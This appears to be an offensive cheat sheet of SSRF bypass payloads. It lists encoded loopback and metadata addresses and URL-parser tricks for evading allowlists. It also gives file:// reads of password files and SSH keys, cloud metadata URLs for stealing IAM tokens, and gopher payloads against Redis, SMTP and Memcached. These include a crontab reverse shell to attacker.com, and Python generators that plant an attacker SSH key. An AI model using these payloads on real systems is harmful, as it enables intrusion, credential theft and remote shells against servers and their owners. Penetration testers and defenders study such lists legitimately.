# SSRF Bypass Payloads & Exploitation Techniques

## IP Address Encoding Variations

### 127.0.0.1 (Loopback) Equivalents

```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/                  # Binds to all interfaces on many systems
http://[::1]/                     # IPv6 loopback
http://[::ffff:127.0.0.1]/       # IPv4-mapped IPv6
http://[::ffff:7f00:1]/          # IPv4-mapped IPv6 hex
http://2130706433/                # Decimal: 127*256^3 + 0*256^2 + 0*256 + 1
http://0177.0.0.1/               # Octal first octet
http://017700000001/             # Full octal
http://0x7f000001/               # Hex
http://0x7f.0x00.0x00.0x01/     # Hex octets
http://127.000.000.001/          # Zero-padded octets
http://127.1/                    # Abbreviated (127.0.0.1)
http://127.0.1/                  # Abbreviated
http://0/                        # Resolves to 0.0.0.0 → loopback
http://①②⑦.⓪.⓪.①/            # Unicode digits (browser normalization)
```

### AWS Metadata Endpoint (169.254.169.254) Equivalents

```
http://169.254.169.254/
http://[::ffff:169.254.169.254]/
http://[::ffff:a9fe:a9fe]/       # IPv6 hex
http://2852039166/               # Decimal
http://0251.0376.0251.0376/      # Octal
http://0xa9.0xfe.0xa9.0xfe/     # Hex
http://169.254.169.254.xip.io/  # DNS wildcard (nip.io/xip.io)
http://169.254.169.254.nip.io/
# Some apps use nip.io — subdomain resolves to embedded IP
```

---

## URL Parser Confusion Attacks

### The `@` Trick (Userinfo Bypass)

```
# URL format: scheme://userinfo@host/path
# Some parsers extract "host" as everything after @

http://allowed.com@internal.host/path
# Parser A: host = internal.host (correct RFC behavior)
# Parser B: host = allowed.com (treats @internal.host as path) → FAILS check but passes!

# Bypass allowlist "must contain allowed.com":
http://allowed.com@169.254.169.254/latest/meta-data/
https://www.allowed.com@192.168.1.1/admin
```

### The `#` Fragment Trick

```
# Fragment is not sent to server but may confuse parser
http://169.254.169.254#@allowed.com
http://169.254.169.254/secret#@allowed.com
# Parser A: host = 169.254.169.254 (correct)
# Parser B: sees @allowed.com, thinks host = allowed.com → passes check
```

### Backslash Trick (Browser Normalization)

```
http://allowed.com\@169.254.169.254/
http:\//169.254.169.254/
http:\/\/169.254.169.254/
```

### Subdomain Bypass

```
# If allowlist checks "must end with trusted.com":
http://trusted.com.attacker.com/      # Ends with trusted.com but is different domain!
http://trusted.com.169.254.169.254.nip.io/

# If allowlist checks "must start with trusted.com":
http://trusted.com.attacker.com/      # Starts with trusted.com... from attacker
```

### URL Path Tricks

```
# Allowlist: URL must start with https://allowed.com/
https://allowed.com/../../etc/passwd         # Path traversal (for file:// contexts)
https://allowed.com@169.254.169.254/path     # @ trick
https://allowed.com?redirect=http://internal # Open redirect at allowed.com
```

---

## Protocol Handlers

### file:// — Local File Read

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///app/.env
file:///var/www/html/config.php
file:///home/ubuntu/.ssh/id_rsa
file://localhost/etc/passwd
file:///C:/Windows/win.ini         # Windows
file:///C:/inetpub/wwwroot/web.config
```

### gopher:// — TCP Connection

Gopher protocol sends raw data to TCP ports. Used to exploit internal services.

**Format:** `gopher://HOST:PORT/_{DATA}`

The `_` is a dummy first character that gopher ignores. After `_`, all bytes are sent to the port.

**Redis attack (key injection):**
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$52%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**Memcached attack (cache poisoning):**
```
gopher://127.0.0.1:11211/_%0d%0aset%20cachedkey%200%200%2015%0d%0amalicious_value%0d%0a
```

**SMTP attack (send email as another user):**
```
gopher://127.0.0.1:25/_EHLO%20localhost%0d%0aMAIL%20FROM%3A%3Cadmin%40target.com%3E%0d%0aRCPT%20TO%3A%3Cattacker%40evil.com%3E%0d%0aDATA%0d%0aFrom%3A%20admin%40target.com%0d%0aSubject%3A%20Password%20Reset%0d%0a%0d%0aClick%20here%3A%20http%3A%2F%2Fattacker.com%2Fphish%0d%0a.%0d%0aQUIT%0d%0a
```

**FTP bounce attack:**
```
gopher://127.0.0.1:21/_USER%20anonymous%0d%0aPASS%20user%40domain.com%0d%0aLIST%0d%0aQUIT%0d%0a
```

### dict:// — Port Scanning

```
dict://127.0.0.1:22/  → Returns SSH banner if port 22 is open
dict://127.0.0.1:80/
dict://127.0.0.1:3306/  → MySQL banner
dict://127.0.0.1:5432/  → PostgreSQL
dict://127.0.0.1:6379/  → Redis
dict://127.0.0.1:11211/ → Memcached
```

### ftp:// — FTP Server Interaction

```
ftp://127.0.0.1:21/
ftp://127.0.0.1/etc/passwd   # On some FTP servers
```

### ldap:// / ldaps:// — LDAP Server

```
ldap://127.0.0.1/
ldap://internal-ldap.corp.local/
```

---

## Cloud Metadata Endpoints

### AWS EC2 IMDSv1 (No Authentication Required)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token — CRITICAL!

http://169.254.169.254/latest/user-data
# May contain startup scripts with secrets!

http://169.254.169.254/latest/dynamic/instance-identity/document
# Returns: account ID, region, instance type
```

### AWS ECS Container Metadata

```
# Check environment for AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
# Or:
http://169.254.170.2/v2/credentials/CREDENTIAL_ID
```

### GCP (Google Cloud Platform)

```
http://metadata.google.internal/
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
# But some SSRF setups allow setting headers

http://169.254.169.254/computeMetadata/v1/         # Alternative IP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns: access_token, token_type, expires_in — CRITICAL!

http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/zone
```

### Azure IMDS

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
# But try without — some configs are permissive

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Returns managed identity access token — CRITICAL!
```

### Alibaba Cloud (Alibaba ECS)

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
# Returns RAM credentials — CRITICAL!
```

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
```

### Oracle Cloud

```
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v2/instance/
```

---

## DNS Rebinding Setup

### Attack Flow

1. Register `evil.attacker.com` with very low TTL (set to 0 or 1 second)
2. First request: `evil.attacker.com` resolves to `1.2.3.4` (your real server)
3. Server validates: `1.2.3.4` is public — passes SSRF check
4. Change DNS: `evil.attacker.com` now resolves to `127.0.0.1`
5. Application makes actual HTTP request — DNS cache expired — resolves to `127.0.0.1`
6. Server makes request to `http://127.0.0.1/admin`

### Tools for DNS Rebinding

```bash
# Singularity of Origin — DNS rebinding toolkit
git clone https://github.com/nccgroup/singularity
# Configure: manager → points to your attacker server
# Attack host → target internal address

# rbndr — simple DNS rebinding service
# Use: target.YOUR_IP.rbndr.us  → first resolves to YOUR_IP, then to target IP

# interactsh with DNS control
python3 -m singularity -D evil.com -dns 127.0.0.1
```

---

## Open Redirect Chaining for SSRF

### Using Open Redirects to Bypass Domain Allowlists

```
# Application allows fetching from: https://trusted.com/*
# trusted.com has an open redirect at: /redirect?url=ANYWHERE

# Step 1: Find open redirect on trusted domain
GET https://trusted.com/redirect?url=http://169.254.169.254/

# Step 2: Use redirect as SSRF pivot
Payload URL: https://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Application fetches trusted.com → gets 302 redirect → follows redirect to 169.254.169.254!
```

### Common Open Redirect Locations

```
/redirect?url=TARGET
/goto?url=TARGET
/link?to=TARGET
/forward?url=TARGET
/out?url=TARGET
/?next=TARGET
/logout?redirect=TARGET
/sso?continue=TARGET
/oauth/authorize?redirect_uri=TARGET
```

---

## Gopher Payloads — Pre-Built

### Redis SSRF → RCE (Write SSH key or crontab)

```bash
# URL-encoded gopher payload to write crontab
# Assumes Redis is running without auth on localhost:6379

# First, generate the payload
python3 -c "
import urllib.parse

commands = [
    '*1\r\n\$8\r\nflushall\r\n',
    '*3\r\n\$3\r\nset\r\n\$1\r\n1\r\n\$63\r\n\n\n*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n\n\r\n',
    '*4\r\n\$6\r\nconfig\r\n\$3\r\nset\r\n\$3\r\ndir\r\n\$16\r\n/var/spool/cron\r\n',
    '*4\r\n\$6\r\nconfig\r\n\$3\r\nset\r\n\$10\r\ndbfilename\r\n\$4\r\nroot\r\n',
    '*1\r\n\$4\r\nsave\r\n',
]

payload = ''.join(commands)
encoded = urllib.parse.quote(payload, safe='')
print(f'gopher://127.0.0.1:6379/_{encoded}')
"
```

### Redis SSRF → SSH Authorized Keys

```bash
# Write SSH public key to /root/.ssh/authorized_keys
# Replace SSH_KEY with your actual public key

python3 - << 'EOF'
import urllib.parse

SSH_KEY = "ssh-rsa AAAA... attacker"
commands = (
    f"*1\r\n$8\r\nflushall\r\n"
    f"*3\r\n$3\r\nset\r\n$1\r\n1\r\n${len(SSH_KEY)+4}\r\n\n\n{SSH_KEY}\n\n\r\n"
    f"*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$11\r\n/root/.ssh/\r\n"
    f"*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$15\r\nauthorized_keys\r\n"
    f"*1\r\n$4\r\nsave\r\n"
)
encoded = urllib.parse.quote(commands, safe='')
print(f"gopher://127.0.0.1:6379/_{encoded}")
EOF
```

### Blind SSRF Detection Payloads

```bash
# Use out-of-band server to confirm SSRF
# Set up: python3 -m http.server 8888 on your server, or use interact.sh

# Payloads to test for blind SSRF:
http://YOUR_SERVER:8888/ssrf-test
https://YOUR_COLLABORATOR.burpcollaborator.net/
http://YOUR_SUBDOMAIN.interact.sh/

# DNS-only SSRF detection (for restrictive egress):
# http://unique-id.YOUR_DOMAIN.com/   (requires DNS server logging)
```
